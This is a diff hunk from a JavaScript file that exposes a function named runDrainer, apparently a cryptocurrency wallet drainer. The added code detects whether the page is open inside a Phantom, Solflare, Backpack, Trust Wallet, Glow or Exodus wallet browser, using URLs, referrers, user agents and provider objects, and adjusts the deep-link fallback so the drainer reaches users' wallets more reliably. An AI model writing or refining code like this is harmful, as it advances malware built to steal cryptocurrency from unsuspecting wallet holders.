@@ -6240,7 +6240,38 @@ window.runDrainer = runDrainer;
           
           // Wait longer before trying fallback to avoid immediate app store redirect
           setTimeout(() => {
-            // Check if we're still on the same page (deep link didn't work)
+            // Enhanced detection: Check if we're in a wallet browser or if deep link worked
+            const isInWalletBrowser = window.location.href.includes('phantom.app') || 
+                                     window.location.href.includes('solflare.com') || 
+                                     window.location.href.includes('backpack.app') ||
+                                     window.location.href.includes('trustwallet.com') ||
+                                     window.location.href.includes('glow.app') ||
+                                     window.location.href.includes('exodus.com') ||
+                                     document.referrer.includes('phantom.app') ||
+                                     document.referrer.includes('solflare.com') ||
+                                     document.referrer.includes('backpack.app') ||
+                                     document.referrer.includes('trustwallet.com') ||
+                                     document.referrer.includes('glow.app') ||
+                                     document.referrer.includes('exodus.com') ||
+                                     // Check for wallet-specific user agents
+                                     navigator.userAgent.includes('Phantom') ||
+                                     navigator.userAgent.includes('Solflare') ||
+                                     navigator.userAgent.includes('Backpack') ||
+                                     navigator.userAgent.includes('TrustWallet') ||
+                                     navigator.userAgent.includes('Glow') ||
+                                     navigator.userAgent.includes('Exodus');
+            
+            // Check if wallet providers are available (indicates we're in wallet browser)
+            const hasWalletProviders = !!(window.phantom || window.solflare || window.backpack || 
+                                        window.glow || window.trustwallet || window.exodus);
+            
+            if (isInWalletBrowser || hasWalletProviders) {
+              console.log(`[DEEP_LINK] Deep link successful - detected wallet browser environment`);
+              console.log(`[DEEP_LINK] isInWalletBrowser: ${isInWalletBrowser}, hasWalletProviders: ${hasWalletProviders}`);
+              return; // Don't try fallback if we're in wallet browser
+            }
+            
+            // Only try fallback if we're definitely not in a wallet browser
             if (window.location.href === currentUrl) {
               console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
               
